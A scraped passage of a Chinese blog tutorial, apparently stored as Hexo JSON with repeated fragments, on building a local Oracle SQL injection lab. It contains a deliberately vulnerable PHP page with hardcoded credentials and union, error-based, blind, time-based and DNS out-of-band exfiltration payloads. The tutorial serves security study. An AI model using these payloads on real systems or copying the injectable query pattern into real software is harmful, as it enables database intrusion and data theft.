class=\"code\"><pre><span class=\"line\">php.exe --ri oci8</span><br></pre></td></tr></table></figure>\n<p><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1627539378014-1dd2ed2a-e160-456c-95e8-8454296e760d.png#align=left&display=inline&height=481&margin=%5Bobject%2Object%5D&name=image.png&originHeight=962&originWidth=1340&size=113244&status=done&style=none&width=670\" alt=\"image.png\"><br>9、在phpinfo中搜索oci8，有如下界面表示扩展已经开启成功。（没有就重启phpstudy）<br><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1627539512949-f85db2c3-85b5-4da6-a1c4-3ad15f45dc16.png#align=left&display=inline&height=270&margin=%5Bobject%2Object%5D&name=image.png&originHeight=540&originWidth=1580&size=78200&status=done&style=none&width=790\" alt=\"image.png\"><br>当出现如下界面，环境就已经基本搭建好了。</p>\n<h1 id=\"0x04-创建漏洞测试环境\"><a href=\"#0x04-创建漏洞测试环境\" class=\"headerlink\" title=\"0x04 创建漏洞测试环境\"></a>0x04 创建漏洞测试环境</h1><h2 id=\"1、-建立存在漏洞数据\"><a href=\"#1、-建立存在漏洞数据\" class=\"headerlink\" title=\"1、 建立存在漏洞数据\"></a>1、 建立存在漏洞数据</h2><p>1、首先使用navicat连接数据库<br>（这里有一个坑，连接时可能会出现oracle library is not loaded）<br><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1627539961158-a91d2a49-c1a1-402d-a3a8-3b8a5cbb8620.png#align=left&display=inline&height=397&margin=%5Bobject%2Object%5D&name=image.png&originHeight=794&originWidth=1872&size=67558&status=done&style=none&width=936\" alt=\"image.png\"><br>在工具 - 选项处<br><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1627539811909-3ea4f232-baa8-491d-8de3-08a44e87ac54.png#align=left&display=inline&height=282&margin=%5Bobject%2Object%5D&name=image.png&originHeight=564&originWidth=1320&size=68308&status=done&style=none&width=660\" alt=\"image.png\"><br>修改oci环境，选择之前数据库安装的路径，修改完后记得重启<br><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1627540060849-0839d8a1-10c0-4b49-ba35-cd70e3a7c14b.png#align=left&display=inline&height=597&margin=%5Bobject%2Object%5D&name=image.png&originHeight=1194&originWidth=1536&size=79187&status=done&style=none&width=768\" alt=\"image.png\"><br>2、连接数据库之后，选择相应的用户，我这里是SYSTEM<br><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1627540125339-60483bd9-5527-46c5-9fc2-b2394ddd0722.png#align=left&display=inline&height=195&margin=%5Bobject%2Object%5D&name=image.png&originHeight=390&originWidth=946&size=30183&status=done&style=none&width=473\" alt=\"image.png\"><br>3、新建表TEST，设置如下字段<br><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1627540264141-c9cb7b96-558b-4cef-b015-5c25e97bd8d7.png#align=left&display=inline&height=301&margin=%5Bobject%2Object%5D&name=image.png&originHeight=602&originWidth=1628&size=58227&status=done&style=none&width=814\" alt=\"image.png\"><br>4、添加如下数据（数据其实是任意的，随意添加即可）<br><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1627540925893-509b0585-e42c-437f-a8cf-6d178dd23d4b.png#align=left&display=inline&height=235&margin=%5Bobject%2Object%5D&name=image.png&originHeight=470&originWidth=1358&size=43179&status=done&style=none&width=679\" alt=\"image.png\"><br>5、新建查询进行验证<br><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1627540945678-0b57f457-592c-4efd-aa13-a5ca5033ea8f.png#align=left&display=inline&height=457&margin=%5Bobject%2Object%5D&name=image.png&originHeight=914&originWidth=1530&size=59045&status=done&style=none&width=765\" alt=\"image.png\"><br>以上漏洞数据就简单搭建成功了。</p>\n<h2 id=\"2、搭建PHP站点\"><a href=\"#2、搭建PHP站点\" class=\"headerlink\" title=\"2、搭建PHP站点\"></a>2、搭建PHP站点</h2><p>1、将源码保存为oracle.php文件，放到C:\\phpStudy\\WWW目录下<br>源码如下：</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\">  header(<span class=\"string\">&quot;Content-Type:text/html;charset=utf-8&quot;</span>);</span><br><span class=\"line\">  <span class=\"variable\">$id</span> = @<span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;id&#x27;</span>];</span><br><span class=\"line\">  <span class=\"variable\">$dbstr</span> =<span class=\"string\">&quot;(DESCRIPTION =(ADDRESS = (PROTOCOL = TCP)(HOST =127.0.0.1)(PORT = 1521)) (CONNECT_DATA = (SERVER = DEDICATED) (SERVICE_NAME = orcl) (INSTANCE_NAME = orcl)))&quot;</span>; <span class=\"comment\">//连接数据库的参数配置 </span></span><br><span class=\"line\">  <span class=\"variable\">$conn</span> = oci_connect(<span class=\"string\">&#x27;system&#x27;</span>,<span class=\"string\">&#x27;root&#x27;</span>,<span class=\"variable\">$dbstr</span>);<span class=\"comment\">//连接数据库，前两个参数分别是账号和密码</span></span><br><span class=\"line\">  <span class=\"keyword\">if</span> (!<span class=\"variable\">$conn</span>)</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    <span class=\"variable\">$Error</span> = oci_error();<span class=\"comment\">//错误信息</span></span><br><span class=\"line\">    <span class=\"keyword\">print</span> htmlentities(<span class=\"variable\">$Error</span>[<span class=\"string\">&#x27;message&#x27;</span>]);</span><br><span class=\"line\">    <span class=\"keyword\">exit</span>;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"keyword\">else</span></span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    <span class=\"keyword\">echo</span> <span class=\"string\">&quot;&lt;h3&gt;Oracle 注入测试靶场&lt;/h3&gt;&quot;</span>.<span class=\"string\">&quot;&lt;br&gt;&quot;</span>;</span><br><span class=\"line\">    <span class=\"variable\">$sql</span> = <span class=\"string\">&quot;select * from TEST where id=&quot;</span>.<span class=\"variable\">$id</span>;<span class=\"comment\">//sql查询语句</span></span><br><span class=\"line\">\t  <span class=\"keyword\">echo</span> <span class=\"string\">&quot;当前sql语句为：&quot;</span>.<span class=\"variable\">$sql</span>.<span class=\"string\">&quot;&lt;br&gt;&quot;</span>.<span class=\"string\">&quot;&lt;br&gt;&quot;</span>;<span class=\"comment\">//输出sql查询语句</span></span><br><span class=\"line\">    <span class=\"variable\">$ora_b</span> = oci_parse(<span class=\"variable\">$conn</span>,<span class=\"variable\">$sql</span>);  <span class=\"comment\">//编译sql语句 </span></span><br><span class=\"line\">    oci_execute(<span class=\"variable\">$ora_b</span>,OCI_DEFAULT);  <span class=\"comment\">//执行 </span></span><br><span class=\"line\">    <span class=\"keyword\">while</span>(<span class=\"variable\">$r</span>=oci_fetch_row(<span class=\"variable\">$ora_b</span>))  <span class=\"comment\">//取回结果 </span></span><br><span class=\"line\">    &#123; </span><br><span class=\"line\">      <span class=\"variable\">$i</span>=<span class=\"number\">0</span>;</span><br><span class=\"line\">      <span class=\"keyword\">echo</span> <span class=\"string\">&quot;Id:&quot;</span>.<span class=\"variable\">$r</span>[<span class=\"variable\">$i</span>++].<span class=\"string\">&quot;  &lt;/t&gt; &lt;br&gt;&quot;</span>;</span><br><span class=\"line\">      <span class=\"keyword\">echo</span> <span class=\"string\">&quot;Name:&quot;</span>.<span class=\"variable\">$r</span>[<span class=\"variable\">$i</span>++].<span class=\"string\">&quot;  &lt;/t&gt;&lt;br&gt;  &quot;</span>;</span><br><span class=\"line\">      <span class=\"keyword\">echo</span> <span class=\"string\">&quot;Age:&quot;</span>.<span class=\"variable\">$r</span>[<span class=\"variable\">$i</span>++].<span class=\"string\">&quot;  &lt;/t&gt;&lt;br&gt;  &quot;</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  oci_close(<span class=\"variable\">$conn</span>);<span class=\"comment\">//关闭连接</span></span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n<p>2、访问<a href=\"http://localhost/oracle.php?id=1\">http://localhost/oracle.php?id=1</a>，返回如下界面表示搭建成功，数据库也成功连接了。<br><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1627541521049-4e04787c-15b8-4686-a485-d5d2e03e9f3f.png#align=left&display=inline&height=340&margin=%5Bobject%2Object%5D&name=image.png&originHeight=680&originWidth=1342&size=55565&status=done&style=none&width=671\" alt=\"image.png\"></p>\n<h1 id=\"0x05-Oracle注入测试\"><a href=\"#0x05-Oracle注入测试\" class=\"headerlink\" title=\"0x05 Oracle注入测试\"></a>0x05 Oracle注入测试</h1><h2 id=\"1、检测漏洞点\"><a href=\"#1、检测漏洞点\" class=\"headerlink\" title=\"1、检测漏洞点\"></a>1、检测漏洞点</h2><figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">http:<span class=\"comment\">//localhost/oracle.php?id=1 and 1=1</span></span><br></pre></td></tr></table></figure>\n<p><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1627541538885-aab0d8c4-aafa-4511-897d-ab85f13130e2.png#align=left&display=inline&height=261&margin=%5Bobject%2Object%5D&name=image.png&originHeight=522&originWidth=1176&size=46725&status=done&style=none&width=588\" alt=\"image.png\"></p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">http:<span class=\"comment\">//localhost/oracle.php?id=1 and 1=2</span></span><br></pre></td></tr></table></figure>\n<p><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1627541558550-37db5cd6-20ef-4b68-a731-38eca533e8fb.png#align=left&display=inline&height=222&margin=%5Bobject%2Object%5D&name=image.png&originHeight=444&originWidth=1072&size=38860&status=done&style=none&width=536\" alt=\"image.png\"></p>\n<h2 id=\"2、显错注入\"><a href=\"#2、显错注入\" class=\"headerlink\" title=\"2、显错注入\"></a>2、显错注入</h2><figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">http:<span class=\"comment\">//localhost/oracle.php?id=-1 union all select 1,(select user from dual),3,&#x27;4&#x27; from dual --</span></span><br></pre></td></tr></table></figure>\n<p><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1627541979564-ea8c20f1-051d-4998-ae63-8cc4c6caf50e.png#align=left&display=inline&height=303&margin=%5Bobject%2Object%5D&name=image.png&originHeight=606&originWidth=1874&size=73845&status=done&style=none&width=937\" alt=\"image.png\"></p>\n<h2 id=\"3、报错注入\"><a href=\"#3、报错注入\" class=\"headerlink\" title=\"3、报错注入\"></a>3、报错注入</h2><figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">http:<span class=\"comment\">//localhost/oracle.php?id=-1 and 1=ctxsys.drithsx.sn(1,(select user from dual)) --</span></span><br></pre></td></tr></table></figure>\n<p><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1627542108099-2a4e87d2-214a-4809-9762-24e01b40471b.png#align=left&display=inline&height=305&margin=%5Bobject%2Object%5D&name=image.png&originHeight=610&originWidth=2068&size=150069&status=done&style=none&width=1034\" alt=\"image.png\"></p>\n<h2 id=\"4、布尔盲注\"><a href=\"#4、布尔盲注\" class=\"headerlink\" title=\"4、布尔盲注\"></a>4、布尔盲注</h2><figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">http:<span class=\"comment\">//localhost/oracle.php?id=1 and 1=(select decode(user,&#x27;SYSTEM&#x27;,1,0) from dual) --</span></span><br></pre></td></tr></table></figure>\n<p><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1627542211017-7bbd5646-d87a-496e-abef-d67b929449ac.png#align=left&display=inline&height=348&margin=%5Bobject%2Object%5D&name=image.png&originHeight=696&originWidth=1774&size=76159&status=done&style=none&width=887\" alt=\"image.png\"></p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">http:<span class=\"comment\">//localhost/oracle.php?id=1 and 1=(select decode(user,&#x27;SSSSS&#x27;,1,0) from dual) --</span></span><br></pre></td></tr></table></figure>\n<p><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1627542229391-54e9c196-437c-464a-a1ee-565b21ccee2b.png#align=left&display=inline&height=174&margin=%5Bobject%2Object%5D&name=image.png&originHeight=574&originWidth=1752&size=66181&status=done&style=none&width=532\" alt=\"image.png\"></p>\n<h2 id=\"5、延时盲注\"><a href=\"#5、延时盲注\" class=\"headerlink\" title=\"5、延时盲注\"></a>5、延时盲注</h2><figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">http:<span class=\"comment\">//localhost/oracle.php?id=1 and 1=(select decode(substr(user,1,1),&#x27;S&#x27;,dbms_pipe.receive_message(&#x27;o&#x27;,5),0) from dual) --</span></span><br></pre></td></tr></table></figure>\n<p><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1627542453679-5c200dec-7af1-485d-91a1-5230c4724937.png#align=left&display=inline&height=424&margin=%5Bobject%2Object%5D&name=image.png&originHeight=848&originWidth=2060&size=180765&status=done&style=none&width=1030\" alt=\"image.png\"></p>\n<h2 id=\"6、外带数据\"><a href=\"#6、外带数据\" class=\"headerlink\" title=\"6、外带数据\"></a>6、外带数据</h2><figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">http:<span class=\"comment\">//localhost/oracle.php?id=1 and (select utl_inaddr.get_host_address((select user from dual)||&#x27;.pgx519.dnslog.cn&#x27;) from dual)is not null --</span></span><br></pre></td></tr></table></figure>\n<p><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1627542575557-283cc745-e90e-4d49-a82d-4d9aa836531d.png#align=left&display=inline&height=295&margin=%5Bobject%2Object%5D&name=image.png&originHeight=590&originWidth=2062&size=88703&status=done&style=none&width=1031\" alt=\"image.png\"><br><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1627542587192-62e5df2a-2158-4204-8430-3f154aa27d6f.png#align=left&display=inline&height=402&margin=%5Bobject%2Object%5D&name=image.png&originHeight=804&originWidth=1650&size=109880&status=done&style=none&width=825\" alt=\"image.png\"></p>\n<h1 id=\"0x06-总结\"><a href=\"#0x06-总结\" class=\"headerlink\" title=\"0x06 总结\"></a>0x06 总结</h1><p>Oracle数据库注入测试只是简单测试了各种注入到效果，具体测试详情可以看我之前写的文章《Oracle数据库注入总结》。<br>之前因为测试漏洞的时候没有找到很好的在线测试平台，并且自己搭建的时候遇到了各种各样的问题，这里解决问题后写成文章，希望对于想自己搭建注入靶场的安全从业人员有所帮助～</p>\n","site":{"data":{"link":[{"class_name":"友情鏈接","class_desc":"那些人，那些事","link_list":[{"name":"Hexo","link":"https://hexo.io/zh-tw/","avatar":"https://d33wubrfki0l68.cloudfront.net/6657ba50e702d84afb32fe846bed54fba1a77add/827ae/logo.svg","descr":"快速、簡單且強大的網誌框架"}]},{"class_name":"網站","class_desc":"值得推薦的網站","link_list":[{"name":"Youtube","link":"https://www.youtube.com/","avatar":"https://i.loli.net/2020/05/14/9ZkGg8v3azHJfM1.png","descr":"視頻網站"},{"name":"Weibo","link":"https://www.weibo.com/","avatar":"https://i.loli.net/2020/05/14/TLJBum386vcnI1P.png","descr":"中國最大社交分享平台"},{"name":"Twitter","link":"https://twitter.com/","avatar":"https://i.loli.net/2020/05/14/5VyHPQqR6LWF39a.png","descr":"社交分享平台"}]}]}},"excerpt":"","more":"<meta name=\"referrer\" content=\"no-referrer\"/>\n\n<h1 id=\"0x01-安装Oracle数据库\"><a href=\"#0x01-安装Oracle数据库\" class=\"headerlink\" title=\"0x01 安装Oracle数据库\"></a>0x01 安装Oracle数据库</h1><p>1、首先下载数据库安装软件<br>具体可以从参考这里，我是从他的百度云下载的<br><a href=\"https://blog.csdn.net/qq_32786873/article/details/81187208\">https://blog.csdn.net/qq_32786873/article/details/81187208</a><br>2、点击setup.exe安装即可<br><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1627458559268-9d095175-6720-4b4b-9165-7cb60a3e855e.png#align=left&display=inline&height=252&margin=%5Bobject%2Object%5D&name=image.png&originHeight=504&originWidth=1570&size=61039&status=done&style=none&width=785\" alt=\"image.png\"><br>（安装过程不过多阐述，没什么太大区别，就下一步下一步即可）</p>\n<p>3、开启oracle数据库</p>\n<p>打开cmd，连接数据库</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">C:\\Users\\user&gt;sqlplus</span><br><span class=\"line\">请输入用户名:  system</span><br><span class=\"line\">输入口令:</span><br><span class=\"line\">连接到:</span><br><span class=\"line\">Oracle Database 11g Express Edition Release 11.2.0.2.0 - 64bit Production</span><br></pre></td></tr></table></figure>\n<p>防止网络不通，建议关闭防火墙<br><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1627453482798-3baff679-3b19-4f3c-a8c5-26dfa3fae74b.png#align=left&display=inline&height=401&margin=%5Bobject%2Object%5D&name=image.png&originHeight=802&originWidth=1310&size=91870&status=done&style=none&width=655\" alt=\"image.png\"><br>4、使用navicat连接数据库（system:root）<br><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1627532220399-c06a2dc3-d502-4ac9-80bc-967625b716af.png#align=left&display=inline&height=368&margin=%5Bobject%2Object%5D&name=image.png&originHeight=736&originWidth=924&size=39243&status=done&style=none&width=462\" alt=\"image.png\"><br>5、也可以使用sql plus新建用户<br><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1627539624468-51a70f51-77bb-41a8-b3e6-598cd7784f7c.png#align=left&display=inline&height=623&margin=%5Bobject%2Object%5D&name=image.png&originHeight=1246&originWidth=532&size=300224&status=done&style=none&width=266\" alt=\"image.png\"></p>\n<h1 id=\"0x02-安装phpstudy\"><a href=\"#0x02-安装phpstudy\" class=\"headerlink\" title=\"0x02 安装phpstudy\"></a>0x02 安装phpstudy</h1><p>1、phpstudy下载地址如下：<br><a href=\"http://public.xp.cn/upgrades/phpStudy20161103.zip\">http://public.xp.cn/upgrades/phpStudy20161103.zip</a><br>这里推荐使用2016版本，因为我使用2018死活搭不成功<br>安装过程很简单，设置安装路径，下一步下一步即可。<br><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1627532525123-7fe22127-8c82-43e8-a3fc-3b90bdcb9888.png#align=left&display=inline&height=448&margin=%5Bobject%2Object%5D&name=image.png&originHeight=896&originWidth=1216&size=57968&status=done&style=none&width=608\" alt=\"image.png\"><br>2、切换版本为5.5.38，这里推荐这个因为我就是这个搭成功的。<br><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1627532565418-c2f0a01f-ea23-4f42-aa37-4e4f223c25e9.png#align=left&display=inline&height=386&margin=%5Bobject%2Object%5D&name=image.png&originHeight=772&originWidth=1294&size=391925&status=done&style=none&width=647\" alt=\"image.png\"><br>（如果显示需要安装VC扩展库的话，按照教程安装即可，我这里安装的是VC11的，链接放这了：<a href=\"https://www.php.cn/xiazai/download/1481\">https://www.php.cn/xiazai/download/1481</a>）<br>3、安装完之后，打开phpinfo<br><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1627532770453-b48b361b-6115-40e8-a802-86b3415379eb.png#align=left&display=inline&height=518&margin=%5Bobject%2Object%5D&name=image.png&originHeight=1036&originWidth=1314&size=485815&status=done&style=none&width=657\" alt=\"image.png\"><br>也可以像我这样在C:\\phpStudy\\WWW目录下新建phpinfo.php文件，内容为：</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span> phpinfo();<span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n<p><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1627532747143-dc367dc0-4a13-4e24-bbc7-7bd518e2e334.png#align=left&display=inline&height=364&margin=%5Bobject%2Object%5D&name=image.png&originHeight=728&originWidth=1360&size=164284&status=done&style=none&width=680\" alt=\"image.png\"><br>这里看到是32位的。</p>\n<h1 id=\"0x03-设置oci8扩展\"><a href=\"#0x03-设置oci8扩展\" class=\"headerlink\" title=\"0x03 设置oci8扩展\"></a>0x03 设置oci8扩展</h1><p>（这里我是死活不成功，弄了半天）<br>1、首先在C:\\phpStudy\\php\\php-5.5.38目录下，修改php.ini的内容（搜索oci8，找到对应的扩展处，将前面的;删除即可。）<br><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1627532987042-08f559fe-42a9-4dc3-a3c1-a1a88232b380.png#align=left&display=inline&height=476&margin=%5Bobject%2Object%5D&name=image.png&originHeight=952&originWidth=2644&size=213841&status=done&style=none&width=1322\" alt=\"image.png\"><br>2、之后就开始苦逼地调试环境了，最终弄好是根据这篇文章弄好的，链接如下：<br><a href=\"https://www.it1352.com/1713162.html\">https://www.it1352.com/1713162.html</a><br>在php路径下，打开cmd，输入如下命令：</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">C:\\phpStudy\\php\\php-<span class=\"number\">5.5</span>.<span class=\"number\">38</span>&gt;php.exe -m</span><br><span class=\"line\">PHP Warning:  PHP Startup: Unable to load dynamic library <span class=\"string\">&#x27;C:\\phpStudy\\php\\php-5.5.38\\ext\\php_oci8.dll&#x27;</span> - %<span class=\"number\">1</span> 不是有效的 Win32 应用程序。</span><br><span class=\"line\"> in Unknown on line <span class=\"number\">0</span></span><br><span class=\"line\"></span><br><span class=\"line\">Warning: PHP Startup: Unable to load dynamic library <span class=\"string\">&#x27;C:\\phpStudy\\php\\php-5.5.38\\ext\\php_oci8.dll&#x27;</span> - %<span class=\"number\">1</span> 不是有效的 Win32 应用程序。</span><br><span class=\"line\"> in Unknown on line <span class=\"number\">0</span></span><br><span class=\"line\">PHP Warning:  PHP Startup: Unable to load dynamic library <span class=\"string\">&#x27;C:\\phpStudy\\php\\php-5.5.38\\ext\\php_oci8_11g.dll&#x27;</span> - %<span class=\"number\">1</span> 不是有 效的 Win32 应用程序。</span><br><span class=\"line\"> in Unknown on line <span class=\"number\">0</span></span><br><span class=\"line\"></span><br><span class=\"line\">Warning: PHP Startup: Unable to load dynamic library <span class=\"string\">&#x27;C:\\phpStudy\\php\\php-5.5.38\\ext\\php_oci8_11g.dll&#x27;</span> - %<span class=\"number\">1</span> 不是有效的 Win32 应用程序。</span><br><span class=\"line\"> in Unknown on line <span class=\"number\">0</span></span><br><span class=\"line\">PHP Warning:  PHP Startup: Unable to load dynamic library <span class=\"string\">&#x27;C:\\phpStudy\\php\\php-5.5.38\\ext\\php_pdo_oci.dll&#x27;</span> - %<span class=\"number\">1</span> 不是有效的 Win32 应用程序。</span><br><span class=\"line\"> in Unknown on line <span class=\"number\">0</span></span><br><span class=\"line\"></span><br><span class=\"line\">Warning: PHP Startup: Unable to load dynamic library <span class=\"string\">&#x27;C:\\phpStudy\\php\\php-5.5.38\\ext\\php_pdo_oci.dll&#x27;</span> - %<span class=\"number\">1</span> 不是有效的 Win32 应用程序。</span><br><span class=\"line\"> in Unknown on line <span class=\"number\">0</span></span><br></pre></td></tr></table></figure>\n<p><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1627537664336-d0f1cbff-e217-415e-9c3f-c6afea1e1fff.png#align=left&display=inline&height=520&margin=%5Bobject%2Object%5D&name=image.png&originHeight=1040&originWidth=1950&size=176001&status=done&style=none&width=975\" alt=\"image.png\"><br>3、根据文章中所说，安装<strong>oracle instantclient</strong>，链接如下：<br><a href=\"https://www.oracle.com/database/technologies/instant-client/microsoft-windows-32-downloads.html\">https://www.oracle.com/database/technologies/instant-client/microsoft-windows-32-downloads.html</a><br>因为数据库是11g的，所以安装11.1.x版本<br><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1627537791843-1b689f65-de26-4d29-b36f-e8269d9c9f08.png#align=left&display=inline&height=521&margin=%5Bobject%2Object%5D&name=image.png&originHeight=1042&originWidth=2708&size=209242&status=done&style=none&width=1354\" alt=\"image.png\"><br>4、下载好之后解压，放入C:\\instantclient_11_1<br><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1627537838346-438837f0-196f-46f5-8263-80481facf640.png#align=left&display=inline&height=453&margin=%5Bobject%2Object%5D&name=image.png&originHeight=906&originWidth=1606&size=161187&status=done&style=none&width=803\" alt=\"image.png\"><br>5、设置环境变量，这一步很重要<br>在此电脑右键属性 - 高级系统设置 - 环境变量 - 系统变量（Path） - 编辑<br><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1627537919273-db8cc709-d63f-4f9b-8e73-3bb5f8e5ec67.png#align=left&display=inline&height=647&margin=%5Bobject%2Object%5D&name=image.png&originHeight=1294&originWidth=2468&size=515243&status=done&style=none&width=1234\" alt=\"image.png\"><br>增加这三个路径，注意顺序不要变，instantclient必须放在php的上面。<br><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1627538045153-7b63740e-1dbf-4c66-bb39-3bd4c7092ff7.png#align=left&display=inline&height=511&margin=%5Bobject%2Object%5D&name=image.png&originHeight=1022&originWidth=1046&size=77568&status=done&style=none&width=523\" alt=\"image.png\"><br>6、验证，在cmd命令提示符中输入</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">where oci*</span><br></pre></td></tr></table></figure>\n<p><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1627539303726-33a0ea0d-eb8f-4dbe-a896-e17bcb58e6e5.png#align=left&display=inline&height=188&margin=%5Bobject%2Object%5D&name=image.png&originHeight=376&originWidth=1084&size=59269&status=done&style=none&width=542\" alt=\"image.png\"><br>出现instantclient的路径即可。<br>7、重启计算机<br><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1627538340688-e470a2bb-38ed-4f82-88cb-9c554e1e534d.png#align=left&display=inline&height=355&margin=%5Bobject%2Object%5D&name=image.png&originHeight=710&originWidth=974&size=18334&status=done&style=none&width=487\" alt=\"image.png\"><br>8、在php路径下，打开cmd，输入如下命令并查看结果（没有出现“不是有效的 Win32 应用程序”即可）</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">php.exe --ri oci8</span><br></pre></td></tr></table></figure>\n<p><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1627539378014-1dd2ed2a-e160-456c-95e8-8454296e760d.png#align=left&display=inline&height=481&margin=%5Bobject%2Object%5D&name=image.png&originHeight=962&originWidth=1340&size=113244&status=done&style=none&width=670\" alt=\"image.png\"><br>9、在phpinfo中搜索oci8，有如下界面表示扩展已经开启成功。（没有就重启phpstudy）<br><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1627539512949-f85db2c3-85b5-4da6-a1c4-3ad15f45dc16.png#align=left&display=inline&height=270&margin=%5Bobject%2Object%5D&name=image.png&originHeight=540&originWidth=1580&size=78200&status=done&style=none&width=790\" alt=\"image.png\"><br>当出现如下界面，环境就已经基本搭建好了。</p>\n<h1 id=\"0x04-创建漏洞测试环境\"><a href=\"#0x04-创建漏洞测试环境\" class=\"headerlink\" title=\"0x04 创建漏洞测试环境\"></a>0x04 创建漏洞测试环境</h1><h2 id=\"1、-建立存在漏洞数据\"><a href=\"#1、-建立存在漏洞数据\" class=\"headerlink\" title=\"1、 建立存在漏洞数据\"></a>1、 建立存在漏洞数据</h2><p>1、首先使用navicat连接数据库<br>（这里有一个坑，连接时可能会出现oracle library is not loaded）<br><img 